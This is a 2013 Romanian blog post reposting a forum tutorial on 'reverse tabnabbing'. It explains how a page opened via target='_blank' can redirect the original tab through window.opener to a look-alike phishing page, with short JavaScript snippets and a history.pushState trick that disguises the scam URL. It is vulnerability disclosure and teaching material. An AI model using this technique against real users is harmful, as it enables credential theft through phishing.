---
id: 51
title: 'Phishing via target=&#8221;_blank&#8221;'
date: 2013-01-06T20:23:49+00:00
author: Silviu Stroe
layout: post
guid: http://silviu-s.com/?p=51
permalink: /phishing-via-target_blank/
dpsp_networks_shares:
  - 'a:0:{}'
tags:
  - blank
  - metoda
  - pishing
  - target
---
Rasfoind astazi forumul RSTCenter.com, am vazut ca acest utilizator a &#8220;reinventat roata&#8221; intr-un mod foarte ingenios. Va prezint in continuare postarea lui de pe forum:

Autor: <a id="yui-gen21" title="B7ackAnge7z is online now" href="https://rstforums.com/forum/members/b7ackange7z/" rel="nofollow"><strong>B7ackAnge7z</strong></a>

Sper să nu greșesc dacă voi spune, că știm cu toții ce e un link și la ce folosește atributul target pentru tag-ul <a>. Și dat fiind faptul că majoritatea consideră inofensivă folosirea acestei tehnici atât de populare, în acest tutorial voi încerca să demonstrez contrariul.

Pentru început vreau să menționez că ceea ce va fi descris aici, personal o consider a fiind o vulnerabilitate pentru toate browserele cu excepția&#8230; _ta-da!_ — Internet Explorer. Iată de ce în continuare voi folosi cuvântul „vulnerabilitate” atunci când mă voi referi la acest „fenomen”.

De asemenea, vă rog să atrageți atenția că această vulnerabilitate v-a funcționa perfect <span style="text-decoration: underline;">doar dacă</span>se va apăsa click de stânga pe link, și nu click de dreapta → „Deschide în filă nouă”.

Și, nu în ultimul rând, așa cum toată lumea recomandă să fie folosit target=&#8221;_blank&#8221; pentru toate link-urile externe (doar nu dorim ca utilizatorul să părăsească pagina noastră), trebuie să constat că această vulnerabilitate afectează majoritatea site-urilor care fac referire la pagini externe.

<span style="font-size: large;"><b>Teorie</b></span>
  
Dacă avem pagina curentă „A” și facem referire la pagina „B” folosind atributul target=&#8221;_blank&#8221;, atunci când se va deschide pagina „B” pentru aceasta va fi creat un obiect window.opener cu ajutorului căruia putem redirecționa pagina „A” către o nouă pagină în timp ce utilizatorul accesează pagina „B”. Și cel mai important, paginile „A” și „B” pot fi pe domenii diferite.

<span style="font-size: large;"><b>Practică</b></span>
  
Pentru a înțelege mai bine despre ce merge vorba, vă recomand următorul exemplu: apăsați <a href="http://black.securrity.com/t_blank/rst-poc/" target="_blank" rel="nofollow">click aici</a>, așteptați să se încarce pagina, după care reveniți înapoi. Dacă apare eroarea „_window.opener is null_” atunci:

  1. Ai deschis link-ul altfel decât folosind click de stânga;
  2. Browserul tău nu e vulnerabil;
  3. Magie neagră?

Pentru un exemplu mai complex, vă rog să accesați <a href="http://white.securrity.com/t_blank/" target="_blank" rel="nofollow">această pagină</a> unde am folosit această vulnerabilitate pentru a simula un atac de tip phishing asupra unui site ce oferă servicii de email. Ca și pentru oricare site asemănător (Gmail, Hotmail ș.a.) fiecare link primit într-un mesaj are atributultarget=&#8221;_blank&#8221;.

<span style="font-size: large;"><b>Explicații</b></span>
  
Pentru a exploata vulnerabilitatea, trimitem un mesaj ce conține adresa URL către pagina „capcană”, unde pentru a fi siguri că utilizatorul a deschis link-ul, folosind click de stânga și nu altă metodă, verificăm dacă există obiectul window.opener și nu este NULL. După care, putem redirecționa pagina de unde a venit utilizatorul. Codul arată cam așa:

<div>
  <div>
    Code:
  </div>
  
  <pre>if (window.opener) {
   window.opener.location.replace('full-url-to-scam-page');
}</pre>
</div>

După cum puteți observa, totul e atât de simplu, atât de banal, atât de periculos&#8230; Dacă pagina de phishing și cea legitimă arată ca 2 picături de apă, iar numele domeniului nu dă de bănuit, când utilizatorul va reveni la pagina inițială cu siguranță, nu va observa modificarea.

Pentru a da mai puțin de bănuit, poate fi modificată adresa URL pentru pagina de phishing în felul următor:

  * De pe pagina **funny.php** e nevoie să trimitem adresa URL (referrer) de unde a venit utilizatorul. Eu am făcut așa: <div>
      <div>
        Code:
      </div>
      
      <pre>var referrer = encodeURIComponent(document.referrer);
window.opener.location = 'http://black.securrity.com/t_blank/scam.php#' + referrer;</pre>
    </div>

  * Apoi, pe pagina **scam.php** am folosit următorul cod: <div>
      <div>
        Code:
      </div>
      
      <pre>// Extragem legătura adresei URL și eliminăm numele domeniului
var fakeurl = decodeURIComponent(window.location.hash).replace('#http://white.securrity.com', '');

// Modificăm adresa URL fără a încărca conținutul acelei pagini
window.history.pushState(false, false, fake_url);</pre>
    </div>

<span style="font-size: large;"><b>În loc de concluzii</b></span>
  
Sincer, nu înțeleg, ce a fost în capul dezvoltatorilor ca să permită executarea funcțieilocation.replace() sau modificarea obiectului location dintre două domenii diferite? Dacă era de pe același domeniu, înțelegeam&#8230; Și chiar e foarte straniu, căci celelalte funcții și atribute ale obiectului window.opener nu pot nici măcar citite, deoarece:

<div>
  <div>
    <div>
      <div>
      </div>
      
      <div>
        <img title="Quote" alt="Quote" src="https://rstforums.com/forum/elitex360/misc/quote_icon.png" /> Originally Posted by <strong>Firefox</strong>
      </div>
      
      <div>
        Error: Permission denied to access property &#8216;bla-bla-bla&#8217;
      </div>
    </div>
  </div>
</div>

Sursa: https://rstforums.com/forum/63056-phishing-via-target-_blank.rst